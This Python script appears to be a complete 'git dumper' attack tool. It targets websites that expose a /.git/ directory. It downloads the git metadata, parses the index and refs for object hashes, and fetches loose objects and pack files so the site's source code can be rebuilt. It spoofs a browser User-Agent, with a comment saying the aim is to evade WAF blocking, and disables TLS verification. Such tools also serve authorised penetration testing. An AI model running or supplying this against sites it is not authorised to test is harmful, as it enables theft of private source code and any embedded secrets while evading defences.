#!/usr/bin/env python3
import requests, os, sys, json, re
import gin
import os.path
import concurrent.futures
from urllib3.exceptions import InsecureRequestWarning


# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# To evade WAF blocking because of Python default User-Agent
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36'}


URL = ""
outputFolder = "output/"

fileNamesList = ["index", "FETCH_HEAD", "HEAD", "ORIG_HEAD", "config", "description", "packed-refs", "info/exclude",
				"info/refs", "logs/HEAD", "logs/refs/heads/develop", "logs/refs/heads/master", "logs/refs/remotes/origin/develop"
				, "logs/refs/remotes/origin/step_develop", "logs/refs/remotes/origin/master", "logs/refs/remotes/github/master", 
				"refs/heads/develop", "refs/heads/master", "refs/remotes/origin/develop", "refs/remotes/origin/master",
				 "refs/remotes/origin/step_develop", "refs/remotes/github/master", "objects/info/packs", "refs/remotes/origin/HEAD"]

dirNamesList = ["info", "logs", "logs/refs", "logs/refs/heads", "logs/refs/remotes", "logs/refs/remotes/github",
				"logs/refs/remotes/origin", "refs", "refs/heads", "refs/remotes", "refs/remotes/origin", "refs/remotes/github", 
				"refs/tags","objects" , "objects/info", "objects/pack"]





def has_hsts(URL):
    """
    Connect to target site and check its headers."
    """
    try:
        req = requests.get('https://' + URL)
    except requests.exceptions.SSLError as error:
        print("doesn't have SSL working properly" + error)
        return False
    if 'strict-transport-security' in req.headers:
        print("strict-transport-security YES")
        return True
    else:
        print("strict-transport-security NO")
        return False

def fixURL():
	global URL

	if "http" not in URL and "https" not in URL:
		if has_hsts(URL):
			URL = "https://" + URL
		else:
			URL = "http://" + URL

	if ".git" not in URL:
		if URL.endswith("/"):
			URL = URL + ".git/"
		else:
			URL = URL + "/.git/"

	if not URL.endswith("/"):
			URL = URL + "/"

	print("URL for test: " + URL)
	return URL



def createDir():

	if not os.path.exists(outputFolder):
		os.mkdir(outputFolder)

	if not os.path.exists(outputFolder + ".git"):
		os.mkdir(outputFolder + ".git")

	for dirName in dirNamesList:
		if not os.path.exists(outputFolder + ".git/" + dirName):
			os.mkdir(outputFolder + ".git/" +  dirName)

	# # .git/refs/tags/ missing  and .git/branches/ missing

	for i in range(0,256):
		dirName = str( format(i, 'x') ).zfill(2)
		if not os.path.exists(outputFolder + ".git/objects/" + dirName):
			os.mkdir(outputFolder + ".git/objects/" + dirName)



def gitFilesDownload(fileName):
	print("Fetching: " + URL+fileName)
	try:
		downloaded = requests.get(URL+fileName, allow_redirects=False, headers=headers, verify=False).content
		if len(downloaded) > 0 and (not ("<!DOCTYPE html>" in str(downloaded) or "<html>" in str(downloaded) or '<html lang="en">' in str(downloaded) or str(downloaded).isspace() or str(downloaded) == "")):
			with open(outputFolder + ".git/" + fileName, "wb+") as f:
				f.write(downloaded)
	except Exception as e:
		print (e)


def sha1Extractor():
	# # parse .git/index file
	# # .git/HEAD , .git/logs/HEAD , .git/logs/refs/heads/master , .git/logs/refs/remotes/github/master
	# # .git/packed-refs  ,  .git/ORIG_HEAD  , .git/info/refs
	# # .git/refs/heads/master , .git/refs/remotes/github/master , 
	# # .git/refs/remotes/origin/HEAD

	print("Parsing Index File")

	jsonList = gin.parse_file(outputFolder + ".git/index", pretty=False)

	sha1List = []
	for element in jsonList:
		data = json.loads(element)
		try:
			sha1List.append(data['sha1'])
		except:
			pass

	filesToParse = [".git/HEAD", ".git/logs/HEAD", ".git/logs/refs/heads/master",
		 ".git/logs/refs/remotes/github/master", ".git/packed-refs", ".git/ORIG_HEAD",
		 ".git/info/refs", ".git/refs/heads/master", ".git/refs/remotes/github/master",
		 ".git/refs/remotes/origin/HEAD"]

	for fileToParse in filesToParse:
		if os.path.exists(outputFolder + fileToParse):
			with open(outputFolder + fileToParse , "r", encoding="utf8") as f:
				text = f.read()
				# extract sha1 (40 character words) from files 
				sha1List = sha1List + re.findall(r'\b\w{{{}}}\b'.format(40), text)

	sha1List = list(set(sha1List))

	return sha1List


def filesDownloadMatchingSHA1(sha1):
	endpoint = "objects/" + sha1[:2] + "/" + sha1[-38:]
	print("Fetching: " + URL + endpoint)
	try:
		downloaded = requests.get(URL + endpoint, allow_redirects=False, headers=headers, verify=False).content
		if len(downloaded) > 0 and (not ("<!DOCTYPE html>" in str(downloaded) or "<html>" in str(downloaded) or '<html lang="en">' in str(downloaded) or str(downloaded).isspace() or str(downloaded) == "")):
			with open(outputFolder + ".git/" + endpoint, "wb+") as f:
				f.write(downloaded)
	except Exception as e:
		print(str(e))
		pass


def isPackFilesExist():
	if os.path.isfile(outputFolder + ".git/objects/info/packs"):
		with open(outputFolder + ".git/objects/info/packs") as f:
			downloaded = f.readlines()
			if ("<!DOCTYPE html>" in str(downloaded) or "<html>" in str(downloaded) or '<html lang="en">' in str(downloaded) or str(downloaded).isspace() or str(downloaded) == ""):
				print("pack file not available -> exiting")
				return False
			return True
	
	return False


def packFileDownload(line):
	if line.isspace():
		return
	try:
		endpoint = "objects/pack/" + line[-51:-1]
		print("Fetching " + URL + endpoint)
		downloaded = requests.get(URL + endpoint, allow_redirects=False, headers=headers, verify=False).content
		if len(downloaded) > 0 and (not ("<!DOCTYPE html>" in str(downloaded) or "<html>" in str(downloaded) or '<html lang="en">' in str(downloaded) or str(downloaded).isspace() or str(downloaded) == "")):
			with open(outputFolder + ".git/" + endpoint, "wb+") as packFile:
				packFile.write(downloaded)  # pack file
	except Exception as e:
			print(str(e))
			pass

def idxFileDownload(line):
	if line.isspace():
		return
	try:
		endpoint = "objects/pack/" + line[-51:-5] + "idx"
		print("Fetching " + URL + endpoint)
		downloaded = requests.get(URL + endpoint, allow_redirects=False, headers=headers, verify=False).content
		if len(downloaded) > 0 and (not ("<!DOCTYPE html>" in str(downloaded) or "<html>" in str(downloaded) or '<html lang="en">' in str(downloaded) or str(downloaded).isspace() or str(downloaded) == "")):
			with open(outputFolder + ".git/" + endpoint, "wb+") as idxFile:
				idxFile.write(downloaded) #idx file

	except Exception as e:
		print(str(e))
		pass


def gitDumper():
	createDir()

	with concurrent.futures.ThreadPoolExecutor() as executor:
		results = executor.map(gitFilesDownload, fileNamesList)
	
	sha1List = sha1Extractor()

	with concurrent.futures.ThreadPoolExecutor() as executor:
		results = executor.map(filesDownloadMatchingSHA1, sha1List)

	if isPackFilesExist():
		print("File exists .git/objects/info/packs -> try getting idx and pack files")

		fileLines = []
		with open(outputFolder + ".git/objects/info/packs") as f:
			fileLines = f.readlines()

		with concurrent.futures.ThreadPoolExecutor() as executor:
			results = executor.map(packFileDownload, fileLines)

		with concurrent.futures.ThreadPoolExecutor() as executor:
			results = executor.map(idxFileDownload, fileLines)

	print("Script Executed Successfully")

	if os.name == "nt":
		print("Run following command to retrieve source code: cd output ; git checkout -- .")
	else:
		print("Run following command to retrieve source code: cd output && git checkout -- .")




def main():
	global URL

	if os.path.exists(outputFolder + ".git"):
		print("Directory already exists please remove before running: " + outputFolder + ".git")
		exit()

	if len(sys.argv) < 2:
		print("Please provide website URL with /.git/ directory e.g. example.com/.git/")
		exit()


	URL = sys.argv[1]
	fixURL()
	gitDumper()





if __name__ == "__main__":
	main()
